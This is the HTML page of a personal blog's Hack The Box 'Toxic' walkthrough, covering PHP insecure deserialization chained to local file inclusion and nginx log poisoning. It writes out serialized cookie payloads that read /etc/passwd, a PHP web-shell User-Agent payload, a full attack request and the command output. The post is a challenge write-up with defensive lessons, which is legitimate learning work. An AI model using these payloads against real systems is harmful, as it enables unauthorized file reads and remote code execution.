<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Toxic HTB Walkthrough | All Things Cyber – joonkim0625</title>
<meta name="keywords" content="HTB, Toxic, PHP, insecure deserialization, LFI, log poisoning, RCE, web hacking">
<meta name="description" content="This post documents my process for solving the Toxic box on Hack The Box. This box is all about PHP insecure deserialization, exploiting LFI, and using log poisoning to achieve remote code execution.
Synopsis
PHP insecure deserialization to LFI that abuses log poisoning for RCE.
Learning
References:

https://ianpeter.medium.com/exploiting-log-poisoning-through-lfi-and-serialization-in-php-e039e7b126ad
The official writeup

I wasn&rsquo;t sure what to do at first, so I checked the writeup after struggling for a while.
Challenge Analysis &amp; Source Code Review
The web page didn&rsquo;t reveal much, but looking at the source code, you see:">
<meta name="author" content="Joon Kim">
<link rel="canonical" href="https://joonkim0625.github.io/posts/2025-04-21-toxic/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2025-04-21-toxic/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2025-04-21-toxic/">
  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
  <meta property="og:title" content="Toxic HTB Walkthrough">
  <meta property="og:description" content="This post documents my process for solving the Toxic box on Hack The Box. This box is all about PHP insecure deserialization, exploiting LFI, and using log poisoning to achieve remote code execution.
Synopsis PHP insecure deserialization to LFI that abuses log poisoning for RCE.
Learning References:
https://ianpeter.medium.com/exploiting-log-poisoning-through-lfi-and-serialization-in-php-e039e7b126ad The official writeup I wasn’t sure what to do at first, so I checked the writeup after struggling for a while.
Challenge Analysis &amp; Source Code Review The web page didn’t reveal much, but looking at the source code, you see:">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-04-21T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-04-21T00:00:00+00:00">
    <meta property="article:tag" content="HTB">
    <meta property="article:tag" content="Toxic">
    <meta property="article:tag" content="PHP">
    <meta property="article:tag" content="Insecure Deserialization">
    <meta property="article:tag" content="LFI">
    <meta property="article:tag" content="Log Poisoning">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Toxic HTB Walkthrough">
<meta name="twitter:description" content="This post documents my process for solving the Toxic box on Hack The Box. This box is all about PHP insecure deserialization, exploiting LFI, and using log poisoning to achieve remote code execution.
Synopsis
PHP insecure deserialization to LFI that abuses log poisoning for RCE.
Learning
References:

https://ianpeter.medium.com/exploiting-log-poisoning-through-lfi-and-serialization-in-php-e039e7b126ad
The official writeup

I wasn&rsquo;t sure what to do at first, so I checked the writeup after struggling for a while.
Challenge Analysis &amp; Source Code Review
The web page didn&rsquo;t reveal much, but looking at the source code, you see:">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://joonkim0625.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Toxic HTB Walkthrough",
      "item": "https://joonkim0625.github.io/posts/2025-04-21-toxic/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Toxic HTB Walkthrough",
  "name": "Toxic HTB Walkthrough",
  "description": "This post documents my process for solving the Toxic box on Hack The Box. This box is all about PHP insecure deserialization, exploiting LFI, and using log poisoning to achieve remote code execution.\nSynopsis PHP insecure deserialization to LFI that abuses log poisoning for RCE.\nLearning References:\nhttps://ianpeter.medium.com/exploiting-log-poisoning-through-lfi-and-serialization-in-php-e039e7b126ad The official writeup I wasn\u0026rsquo;t sure what to do at first, so I checked the writeup after struggling for a while.\nChallenge Analysis \u0026amp; Source Code Review The web page didn\u0026rsquo;t reveal much, but looking at the source code, you see:\n",
  "keywords": [
    "HTB", "Toxic", "PHP", "insecure deserialization", "LFI", "log poisoning", "RCE", "web hacking"
  ],
  "articleBody": "This post documents my process for solving the Toxic box on Hack The Box. This box is all about PHP insecure deserialization, exploiting LFI, and using log poisoning to achieve remote code execution.\nSynopsis PHP insecure deserialization to LFI that abuses log poisoning for RCE.\nLearning References:\nhttps://ianpeter.medium.com/exploiting-log-poisoning-through-lfi-and-serialization-in-php-e039e7b126ad The official writeup I wasn’t sure what to do at first, so I checked the writeup after struggling for a while.\nChallenge Analysis \u0026 Source Code Review The web page didn’t reveal much, but looking at the source code, you see:\n\u003c?php spl_autoload_register(function ($name){ if (preg_match('/Model$/', $name)) { $name = \"models/${name}\"; } include_once \"${name}.php\"; }); if (empty($_COOKIE['PHPSESSID'])) { $page = new PageModel; $page-\u003efile = '/www/index.html'; setcookie( 'PHPSESSID', base64_encode(serialize($page)), time()+60*60*24, '/' ); } $cookie = base64_decode($_COOKIE['PHPSESSID']); unserialize($cookie); Since the challenge is about PHP’s insecure deserialization, unserialize() is the dangerous function. It’s called directly on a user-controlled cookie.\nThe PageModel class:\n\u003c?php class PageModel { public $file; public function __destruct() { include($this-\u003efile); } } When the PageModel object is destroyed, it includes whatever file is specified in $file. By manipulating the serialized cookie, we can include arbitrary files!\nLFI via Deserialization Here’s how the cookie looks (after base64 decoding):\nO:9:\"PageModel\":1:{s:4:\"file\";s:15:\"/www/index.html\";} Change the file path to another file, like /etc/passwd:\nO:9:\"PageModel\":1:{s:4:\"file\";s:11:\"/etc/passwd\";} Encode this string in base64, set it as your PHPSESSID, and refresh—if the byte count matches, you get the file contents.\nLog Poisoning for RCE To get code execution, exploit log poisoning:\nThe server logs User-Agent headers to /var/log/nginx/access.log. Send a request with a User-Agent payload: \u003c?php system($_GET['cmd']);?\u003e Use the LFI (via the manipulated cookie) to include /var/log/nginx/access.log. Cookie for LFI:\nEncoded data of: O:9:\"PageModel\":1:{s:4:\"file\";s:25:\"/var/log/nginx/access.log\";} Request example:\nGET /?cmd=cat+/flag_mTjJd HTTP/1.1 Host: 83.136.255.10:41451 User-Agent: \u003c?php system($_GET['cmd']);?\u003e Cookie: PHPSESSID= Then, when you revisit the page with the malicious cookie and trigger the inclusion of the log file, the payload executes. You can use the cmd GET parameter to execute arbitrary commands, such as:\nls / cat flag_mTjJd Sample output:\n10.30.18.176 - 200 \"GET /?cmd=cat+flag_mTjJd HTTP/1.1\" \"-\" \"HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}\" Lessons Learned Insecure deserialization in PHP is extremely dangerous, especially when paired with magic methods like __destruct(). Including user-controlled files leads to LFI and can be chained with log poisoning for code execution. Log poisoning works because web servers typically log unfiltered input, like User-Agent headers, which can be crafted to contain PHP code. Always check for serialized objects in cookies, magic methods, and file inclusions when reviewing CTF or real-world PHP apps. Writeup based on my own exploitation process, with inspiration from CTF and security community references.\n",
  "wordCount" : "419",
  "inLanguage": "en",
  "datePublished": "2025-04-21T00:00:00Z",
  "dateModified": "2025-04-21T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Joon Kim"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://joonkim0625.github.io/posts/2025-04-21-toxic/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "All Things Cyber – joonkim0625",
    "logo": {
      "@type": "ImageObject",
      "url": "https://joonkim0625.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://joonkim0625.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://joonkim0625.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Toxic HTB Walkthrough
    </h1>
    <div class="post-meta"><span title='2025-04-21 00:00:00 +0000 UTC'>April 21, 2025</span>&nbsp;·&nbsp;Joon Kim

</div>
  </header> 
  <div class="post-content"><p>This post documents my process for solving the <strong>Toxic</strong> box on Hack The Box. This box is all about PHP insecure deserialization, exploiting LFI, and using log poisoning to achieve remote code execution.</p>
<h2 id="synopsis">Synopsis<a hidden class="anchor" aria-hidden="true" href="#synopsis">#</a></h2>
<p>PHP insecure deserialization to LFI that abuses log poisoning for RCE.</p>
<h2 id="learning">Learning<a hidden class="anchor" aria-hidden="true" href="#learning">#</a></h2>
<p><strong>References:</strong></p>
<ul>
<li><a href="https://ianpeter.medium.com/exploiting-log-poisoning-through-lfi-and-serialization-in-php-e039e7b126ad">https://ianpeter.medium.com/exploiting-log-poisoning-through-lfi-and-serialization-in-php-e039e7b126ad</a></li>
<li>The official writeup</li>
</ul>
<p>I wasn&rsquo;t sure what to do at first, so I checked the writeup after struggling for a while.</p>
<h2 id="challenge-analysis--source-code-review">Challenge Analysis &amp; Source Code Review<a hidden class="anchor" aria-hidden="true" href="#challenge-analysis--source-code-review">#</a></h2>
<p>The web page didn&rsquo;t reveal much, but looking at the source code, you see:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">spl_autoload_register</span>(<span style="color:#66d9ef">function</span> ($name){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/Model$/&#39;</span>, $name))
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;models/</span><span style="color:#e6db74">${</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include_once</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">.php&#34;</span>;
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($_COOKIE[<span style="color:#e6db74">&#39;PHPSESSID&#39;</span>]))
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $page <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">PageModel</span>;
</span></span><span style="display:flex;"><span>    $page<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/www/index.html&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setcookie</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;PHPSESSID&#39;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">serialize</span>($page)), 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">time</span>()<span style="color:#f92672">+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">*</span><span style="color:#ae81ff">60</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;/&#39;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$cookie <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($_COOKIE[<span style="color:#e6db74">&#39;PHPSESSID&#39;</span>]);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">unserialize</span>($cookie);
</span></span></code></pre></div><p>Since the challenge is about PHP&rsquo;s insecure deserialization, <code>unserialize()</code> is the dangerous function. It’s called directly on a user-controlled cookie.</p>
<p><strong>The PageModel class:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PageModel</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>() 
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}       
</span></span></code></pre></div><p>When the PageModel object is destroyed, it includes whatever file is specified in <code>$file</code>. By manipulating the serialized cookie, we can include arbitrary files!</p>
<h2 id="lfi-via-deserialization">LFI via Deserialization<a hidden class="anchor" aria-hidden="true" href="#lfi-via-deserialization">#</a></h2>
<p>Here’s how the cookie looks (after base64 decoding):</p>
<pre tabindex="0"><code>O:9:&#34;PageModel&#34;:1:{s:4:&#34;file&#34;;s:15:&#34;/www/index.html&#34;;}
</code></pre><p>Change the <code>file</code> path to another file, like <code>/etc/passwd</code>:</p>
<pre tabindex="0"><code>O:9:&#34;PageModel&#34;:1:{s:4:&#34;file&#34;;s:11:&#34;/etc/passwd&#34;;}
</code></pre><p>Encode this string in base64, set it as your PHPSESSID, and refresh—if the byte count matches, you get the file contents.</p>
<h2 id="log-poisoning-for-rce">Log Poisoning for RCE<a hidden class="anchor" aria-hidden="true" href="#log-poisoning-for-rce">#</a></h2>
<p>To get code execution, exploit log poisoning:</p>
<ol>
<li>The server logs User-Agent headers to <code>/var/log/nginx/access.log</code>.</li>
<li>Send a request with a User-Agent payload:
<pre tabindex="0"><code>&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;
</code></pre></li>
<li>Use the LFI (via the manipulated cookie) to include <code>/var/log/nginx/access.log</code>.</li>
</ol>
<p><strong>Cookie for LFI:</strong></p>
<ul>
<li>Encoded data of:
<pre tabindex="0"><code>O:9:&#34;PageModel&#34;:1:{s:4:&#34;file&#34;;s:25:&#34;/var/log/nginx/access.log&#34;;}
</code></pre></li>
</ul>
<p><strong>Request example:</strong></p>
<pre tabindex="0"><code>GET /?cmd=cat+/flag_mTjJd HTTP/1.1
Host: 83.136.255.10:41451
User-Agent: &lt;?php system($_GET[&#39;cmd&#39;]);?&gt;
Cookie: PHPSESSID=&lt;base64-of-LFI-payload&gt;
</code></pre><p>Then, when you revisit the page with the malicious cookie and trigger the inclusion of the log file, the payload executes. You can use the <code>cmd</code> GET parameter to execute arbitrary commands, such as:</p>
<ul>
<li><code>ls /</code></li>
<li><code>cat flag_mTjJd</code></li>
</ul>
<p><strong>Sample output:</strong></p>
<pre tabindex="0"><code>10.30.18.176 - 200 &#34;GET /?cmd=cat+flag_mTjJd HTTP/1.1&#34; &#34;-&#34; &#34;HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}&#34;
</code></pre><h2 id="lessons-learned">Lessons Learned<a hidden class="anchor" aria-hidden="true" href="#lessons-learned">#</a></h2>
<ul>
<li><strong>Insecure deserialization</strong> in PHP is extremely dangerous, especially when paired with magic methods like <code>__destruct()</code>.</li>
<li><strong>Including user-controlled files</strong> leads to LFI and can be chained with log poisoning for code execution.</li>
<li><strong>Log poisoning</strong> works because web servers typically log unfiltered input, like User-Agent headers, which can be crafted to contain PHP code.</li>
<li>Always check for serialized objects in cookies, magic methods, and file inclusions when reviewing CTF or real-world PHP apps.</li>
</ul>
<hr>
<p>Writeup based on my own exploitation process, with inspiration from CTF and security community references.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://joonkim0625.github.io/tags/htb/">HTB</a></li>
      <li><a href="https://joonkim0625.github.io/tags/toxic/">Toxic</a></li>
      <li><a href="https://joonkim0625.github.io/tags/php/">PHP</a></li>
      <li><a href="https://joonkim0625.github.io/tags/insecure-deserialization/">Insecure Deserialization</a></li>
      <li><a href="https://joonkim0625.github.io/tags/lfi/">LFI</a></li>
      <li><a href="https://joonkim0625.github.io/tags/log-poisoning/">Log Poisoning</a></li>
      <li><a href="https://joonkim0625.github.io/tags/rce/">RCE</a></li>
      <li><a href="https://joonkim0625.github.io/tags/web-hacking/">Web Hacking</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
